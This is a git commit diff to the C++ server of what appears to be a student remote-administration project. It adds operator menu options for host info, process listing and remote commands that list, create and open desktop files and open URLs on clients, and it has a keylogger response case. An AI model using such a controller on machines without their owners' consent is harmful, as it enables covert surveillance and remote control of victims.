8813c8908965f1c28893d4a1f2b76b2710532b52
Lucas Martinie de Maisonneuve <lucas.martinie-de-maisonneuve@laplateforme.io>
2025-07-26 14:05:17 +0200

    ✨ feat(SystemCommand): added system command functions - retrieve desktop path using systeminfo getUsername() method - List of files on desktop - Open files on desktop - Create files on desktop - Open url using chrome

--- Server/src/LPTF_Server.cpp
+++ Server/src/LPTF_Server.cpp
@@ -202,34 +202,86 @@ void LPTF_Server::handleAdminInput()
             return;
         }
 
-        for (auto *client : clientSockets){
+        for (auto *client : clientSockets)
+        {
             switch (input)
             {
+            case 1:
+            {
+                cout << "Connected clients:\n";
+                cout << "- fd: " << client->get_fd() << "\n";
+                break;
+            }
+            case 2:
+            {
+                cout << "Enter message to send: ";
+                string msg;
+                getline(cin, msg);
+                LPTF_Packet packet(0x01, vector<uint8_t>(msg.begin(), msg.end()));
+                auto serialized = packet.serialize();
+                client->sendAll(serialized.data(), serialized.size());
+                break;
+            }
+            case 3:
+            {
+                sendPacketToClient(*client, "> Requesting host info", CommandType::HOST_INFO_REQUEST);
+                break;
+            }
+            case 4:
+            {
+                sendPacketToClient(*client, "> Requesting process list", CommandType::LIST_PROCESSES_REQUEST);
+                break;
+            }
+            case 5:
+            {
+                cout << "Command to execute\n"
+                     << "1 - list_desktop_files\n"
+                     << "2 - create_test_file\n"
+                     << "3 - open file\n"
+                     << "4 - open URL\n"
+                     << "Enter command to execute: ";
+                int command;
+                cin.ignore();
+                cin >> command;
+                if (cin.fail())
+                {
+                    cin.clear();
+                    cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
+                    cout << "[SERVER MENU] Invalid input. Please enter a number.\n";
+                    return;
+                }
+                switch (command)
+                {
                 case 1:
                 {
-                    cout << "Connected clients:\n";
-                    cout << "- fd: " << client->get_fd() << "\n";
+                    sendPacketToClient(*client, "list_desktop_files", CommandType::EXECUTE_COMMAND_REQUEST);
                     break;
                 }
                 case 2:
                 {
-                    cout << "Enter message to send: ";
-                    string msg;
-                    getline(cin, msg);
-                    LPTF_Packet packet(0x01, vector<uint8_t>(msg.begin(), msg.end()));
-                    auto serialized = packet.serialize();
-                    client->sendAll(serialized.data(), serialized.size());
+                    sendPacketToClient(*client, "create_test_file", CommandType::EXECUTE_COMMAND_REQUEST);
                     break;
                 }
                 case 3:
                 {
-                    sendPacketToClient(*client, "> Requesting host info", CommandType::HOST_INFO_REQUEST);
+                    cout << "Enter the file name to open: ";
+                    string fileName;
+                    cin.ignore();
+                    getline(cin, fileName);
+
+                    string payload = "opendesktop_file " + fileName;
+                    sendPacketToClient(*client, payload, CommandType::EXECUTE_COMMAND_REQUEST);
                     break;
                 }
-                case 8:
+                case 4:
                 {
-                    cout << "Shutting down server...\n";
-                    exit(0);
+                    cout << "Enter the url: ";
+                    string url;
+                    cin.ignore();
+                    getline(cin, url);
+
+                    string payload = "open_url " + url;
+                    sendPacketToClient(*client, payload, CommandType::EXECUTE_COMMAND_REQUEST);
                     break;
                 }
                 default:
@@ -237,59 +289,119 @@ void LPTF_Server::handleAdminInput()
                     cout << "[SERVER MENU] Unknown command.\n";
                     break;
                 }
-            }
-        }
-    }
-}
-
-void LPTF_Server::handleCommand(const LPTF_Packet& packet)
-{
-    string data(packet.getPayload().begin(), packet.getPayload().end());
-    CommandType type = static_cast<CommandType>(packet.getType());
-
-    for (auto *client : clientSockets) {
-
-        switch (type)
-        {
-            case CommandType::HOST_INFO_RESPONSE:
-            {
-                cout << data << endl;
+                }
                 break;
             }
-
-            case CommandType::KEY_LOG_DATA_RESPONSE:
+            case 8:
             {
-                cout << "[Client] : Starting keylogger..." << endl;
-                break;
-            }
-
-            case CommandType::LIST_PROCESSES_REQUEST:
-
-            {
-                cout << data << endl;
-                break;
-            }
-
-            case CommandType::COMMAND_RESULT_RESPONSE:
-            {
-                cout << data << endl;
-                break;
-            }
-
-            case CommandType::SEND_MESSAGE:
-            {
-                sendPacketToClient(*client, data, CommandType::SEND_MESSAGE);
-
+                cout << "Shutting down server...\n";
+                exit(0);
                 break;
             }
             default:
             {
-                cerr << "[Client] : Unknown command type received: " << static_cast<int>(packet.getType()) << endl;
+                cout << "[SERVER MENU] Unknown command.\n";
                 break;
+            }
             }
         }
     }
 }
 
+void LPTF_Server::handleCommand(const LPTF_Packet &packet)
+{
+    string data(packet.getPayload().begin(), packet.getPayload().end());
+    CommandType type = static_cast<CommandType>(packet.getType());
 
+    for (auto *client : clientSockets)
+    {
 
+        switch (type)
+        {
+        case CommandType::HOST_INFO_RESPONSE:
+        {
+            cout << data << endl;
+            break;
+        }
+
+        case CommandType::KEY_LOG_DATA_RESPONSE:
+        {
+            cout << "[Client] : Starting keylogger..." << endl;
+            break;
+        }
+
+        case CommandType::LIST_PROCESSES_RESPONSE:
+        {
+            vector<vector<string>> processes = deserializeStringTable(packet.getPayload());
+            cout << "[Client] : List of processes received:\n";
+            for (const auto &process : processes)
+            {
+                cout << "Process: " << left << setw(20) << process[0].substr(0, 18)
+                     << " PID: " << setw(6) << process[1]
+                     << " | PPID: " << setw(6) << process[2]
+                     << " | Threads: " << setw(4) << process[3]
+                     << " | Priority: " << setw(3) << process[4]
+                     << " | Runtime: " << process[5] << endl;
+            }
+            break;
+        }
+        case CommandType::COMMAND_RESULT_RESPONSE:
+        {
+            cout << data << endl;
+            break;
+        }
+
+        case CommandType::SEND_MESSAGE:
+        {
+            sendPacketToClient(*client, data, CommandType::SEND_MESSAGE);
+            break;
+        }
+        default:
+        {
+            cerr << "[Client] : Unknown command type received: " << static_cast<int>(packet.getType()) << endl;
+            break;
+        }
+        }
+    }
+}
+
+vector<vector<string>> LPTF_Server::deserializeStringTable(const vector<uint8_t> &payload)
+{
+    vector<vector<string>> result;
+    size_t offset = 0;
+
+    auto read_uint32 = [&](uint32_t &value)
+    {
+        if (offset + sizeof(uint32_t) > payload.size())
+            throw std::runtime_error("Invalid payload");
+        value = *reinterpret_cast<const uint32_t *>(&payload[offset]);
+        offset += sizeof(uint32_t);
+    };
+
+    uint32_t rowCount;
+    read_uint32(rowCount);
+
+    for (uint32_t i = 0; i < rowCount; ++i)
+    {
+        uint32_t colCount;
+        read_uint32(colCount);
+
+        vector<string> row;
+        for (uint32_t j = 0; j < colCount; ++j)
+        {
+            uint32_t strLen;
+            read_uint32(strLen);
+
+            if (offset + strLen > payload.size())
+                throw std::runtime_error("Invalid payload");
+
+            string cell(payload.begin() + offset, payload.begin() + offset + strLen);
+            offset += strLen;
+
+            row.push_back(cell);
+        }
+        result.push_back(row);
+    }
+
+    return result;
+}
